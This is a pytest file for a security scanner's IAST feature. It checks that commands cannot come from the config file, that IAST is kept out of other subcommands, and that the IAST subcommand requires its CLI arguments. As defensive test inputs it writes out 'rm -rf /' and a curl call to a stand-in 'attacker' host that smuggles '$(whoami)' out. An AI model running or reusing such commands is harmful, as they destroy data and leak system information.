"""Phase 2-P: security-gate tests.

These tests pin the load-bearing security properties of the IAST
harness — properties whose regression would be catastrophic:

1. ``[iast]`` keys in ``.secscan.toml`` are rejected at config
   load time. The config parser cannot be coaxed into populating
   ``ProjectConfig.iast`` from disk.
2. ``secscan all`` NEVER includes the IAST scanner, regardless of
   what's in the config.
3. The dispatcher refuses ``secscan iast`` without all three
   required CLI args, with a clear usage error.
"""

from __future__ import annotations

import io
from contextlib import redirect_stderr, redirect_stdout
from pathlib import Path

import pytest

from secscan.cli import main as cli_main
from secscan.config import ConfigError, _parse_iast

# ---------------------------------------------------------------------------
# Config-parser gate (Codex Phase 2-P design review MUST-FIX #1)
# ---------------------------------------------------------------------------


class TestConfigParserRejectsAllIastKeys:
    """``_parse_iast`` rejects ANY non-empty ``[iast]`` table —
    not just ``command``. This is the strongest possible policy
    against config-origin RCE."""

    def test_command_key_rejected(self) -> None:
        with pytest.raises(ConfigError, match="CLI-only"):
            _parse_iast({"command": "rm -rf /"})

    def test_probe_url_key_rejected(self) -> None:
        with pytest.raises(ConfigError, match="CLI-only"):
            _parse_iast({"probe_url": "http://127.0.0.1"})

    def test_pyrasp_log_key_rejected(self) -> None:
        with pytest.raises(ConfigError, match="CLI-only"):
            _parse_iast({"pyrasp_log": "/tmp/p.json"})

    def test_allow_risky_probes_key_rejected(self) -> None:
        with pytest.raises(ConfigError, match="CLI-only"):
            _parse_iast({"allow_risky_probes": True})

    def test_unknown_key_also_rejected(self) -> None:
        """Even a key that isn't ``command`` (and therefore not
        an RCE vector by itself) must be refused — uniform policy
        across the table avoids accidentally allowing a future
        sensitive key by forgetting to add it to a deny-list."""
        with pytest.raises(ConfigError, match="CLI-only"):
            _parse_iast({"some_future_field": 42})

    def test_empty_table_accepted(self) -> None:
        cfg = _parse_iast({})
        assert cfg.command == ""
        assert cfg.probe_url == ""


# ---------------------------------------------------------------------------
# End-to-end CLI gate: ``.secscan.toml`` with ``[iast]`` must fail
# ---------------------------------------------------------------------------


class TestSecscanAllRefusesIastConfig:
    def test_secscan_all_blocks_iast_command_in_config(
        self, tmp_path: Path
    ) -> None:
        """A ``.secscan.toml`` with ``[iast].command`` must fail
        ``secscan all`` at config parse time, BEFORE any scanner
        runs. Exit code 2 (SCAN_ERROR)."""
        (tmp_path / ".secscan.toml").write_text(
            '[iast]\ncommand = "/usr/bin/curl https://attacker/$(whoami)"\n'
        )
        stderr = io.StringIO()
        stdout = io.StringIO()
        with redirect_stderr(stderr), redirect_stdout(stdout):
            exit_code = cli_main(
                [
                    "all",
                    "--path",
                    str(tmp_path),
                    "--format",
                    "json",
                    "--fail-on",
                    "none",
                ]
            )
        assert exit_code == 2
        assert "CLI-only" in stderr.getvalue()


# ---------------------------------------------------------------------------
# Direct ``secscan iast`` dispatcher guard
# ---------------------------------------------------------------------------


class TestSecscanIastRequiresAllThreeCliArgs:
    def test_missing_command_errors(self, tmp_path: Path) -> None:
        stderr = io.StringIO()
        with redirect_stderr(stderr):
            exit_code = cli_main(
                [
                    "iast",
                    "--path",
                    str(tmp_path),
                    "--probe-url",
                    "http://127.0.0.1:9999",
                    "--pyrasp-log",
                    str(tmp_path / "p.json"),
                ]
            )
        assert exit_code == 2
        assert "requires --command" in stderr.getvalue()

    def test_missing_probe_url_errors(self, tmp_path: Path) -> None:
        stderr = io.StringIO()
        with redirect_stderr(stderr):
            exit_code = cli_main(
                [
                    "iast",
                    "--path",
                    str(tmp_path),
                    "--command",
                    "python -m flask run",
                    "--pyrasp-log",
                    str(tmp_path / "p.json"),
                ]
            )
        assert exit_code == 2
        assert "requires --probe-url" in stderr.getvalue()

    def test_missing_pyrasp_log_errors(self, tmp_path: Path) -> None:
        stderr = io.StringIO()
        with redirect_stderr(stderr):
            exit_code = cli_main(
                [
                    "iast",
                    "--path",
                    str(tmp_path),
                    "--command",
                    "python -m flask run",
                    "--probe-url",
                    "http://127.0.0.1:9999",
                ]
            )
        assert exit_code == 2
        assert "requires --pyrasp-log" in stderr.getvalue()


# ---------------------------------------------------------------------------
# secscan all does NOT include IAST even with valid CLI args
# ---------------------------------------------------------------------------


class TestSecscanAllNeverIncludesIast:
    def test_iast_excluded_from_all(self, tmp_path: Path) -> None:
        """``secscan all`` runs zero IAST scans — IAST is always
        excluded from ``all``, period. The scanner registry
        contains IastScanner but ``_build_scanner_instances``
        filters it out unless ``command == 'iast'``."""
        from secscan.cli import ALL_SCANNERS, _build_scanner_instances
        from secscan.config import ProjectConfig

        # IastScanner IS in the registry…
        assert any(c.name == "iast" for c in ALL_SCANNERS)

        # …but never makes it into the instance list for ``all``.
        cfg = ProjectConfig()
        instances = _build_scanner_instances(cfg, command="all")
        assert not any(s.name == "iast" for s in instances)

    def test_iast_excluded_from_other_subcommands(self) -> None:
        """Even ``secscan dast`` (a similar dynamic scanner)
        must NOT pull in IAST — the only legal entry point is
        ``secscan iast`` itself."""
        from secscan.cli import _build_scanner_instances
        from secscan.config import ProjectConfig

        for cmd in ("dast", "apifuzz", "secrets", "image", "sbom"):
            cfg = ProjectConfig()
            instances = _build_scanner_instances(cfg, command=cmd)
            assert not any(
                s.name == "iast" for s in instances
            ), f"iast leaked into 'secscan {cmd}' instance list"

    def test_iast_INCLUDED_only_for_direct_iast_subcommand(self) -> None:
        from secscan.cli import _build_scanner_instances
        from secscan.config import ProjectConfig

        cfg = ProjectConfig()
        instances = _build_scanner_instances(cfg, command="iast")
        assert any(s.name == "iast" for s in instances)
